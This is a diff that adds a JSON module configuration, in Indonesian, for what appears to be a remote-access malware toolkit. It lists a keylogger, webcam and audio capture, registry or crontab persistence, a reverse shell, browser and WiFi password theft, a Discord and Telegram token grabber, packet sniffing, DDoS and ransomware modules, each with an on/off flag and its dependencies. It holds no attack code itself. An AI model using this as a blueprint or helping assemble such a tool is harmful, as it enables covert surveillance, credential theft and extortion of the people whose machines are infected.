@@ -1,0 +1,82 @@
+{
+    "SystemInfo": {
+        "active": true,
+        "description": "Mengambil informasi sistem (OS, hostname, IP, dll)",
+        "dependencies": ["requests"]
+    },
+    "Screenshot": {
+        "active": true,
+        "description": "Mengambil screenshot layar",
+        "dependencies": ["mss"]
+    },
+    "Keylogger": {
+        "active": false,
+        "description": "Merekam keyboard (pynput required)",
+        "dependencies": ["pynput"]
+    },
+    "Webcam": {
+        "active": false,
+        "description": "Mengambil foto dari webcam",
+        "dependencies": ["opencv-python"]
+    },
+    "Persistence": {
+        "active": true,
+        "description": "Memasang persistence (registry / crontab)",
+        "dependencies": []
+    },
+    "FileManager": {
+        "active": true,
+        "description": "Upload/download file, list direktori",
+        "dependencies": []
+    },
+    "ReverseShell": {
+        "active": true,
+        "description": "Eksekusi perintah shell",
+        "dependencies": []
+    },
+    "ProcessManager": {
+        "active": false,
+        "description": "Melihat dan mematikan proses",
+        "dependencies": ["psutil"]
+    },
+    "ClipboardGrabber": {
+        "active": false,
+        "description": "Mengambil isi clipboard",
+        "dependencies": ["pyperclip"]
+    },
+    "AudioRecorder": {
+        "active": false,
+        "description": "Merekam suara dari mikrofon",
+        "dependencies": ["sounddevice", "numpy", "scipy"]
+    },
+    "BrowserStealer": {
+        "active": false,
+        "description": "Mengambil password browser (Chrome, Firefox)",
+        "dependencies": ["pycryptodome", "win32crypt"]
+    },
+    "WiFiGrabber": {
+        "active": false,
+        "description": "Mengambil password WiFi tersimpan",
+        "dependencies": []
+    },
+    "TokenGrabber": {
+        "active": false,
+        "description": "Mengambil token Discord, Telegram, dll",
+        "dependencies": []
+    },
+    "PacketSniffer": {
+        "active": false,
+        "description": "Menyadap paket jaringan (scapy)",
+        "dependencies": ["scapy"]
+    },
+    "DDoS": {
+        "active": false,
+        "description": "Melakukan serangan DDoS sederhana",
+        "dependencies": []
+    },
+    "Ransomware": {
+        "active": false,
+        "description": "Enkripsi file (beta func)",
+        "dependencies": ["cryptography"]
+    }
+}
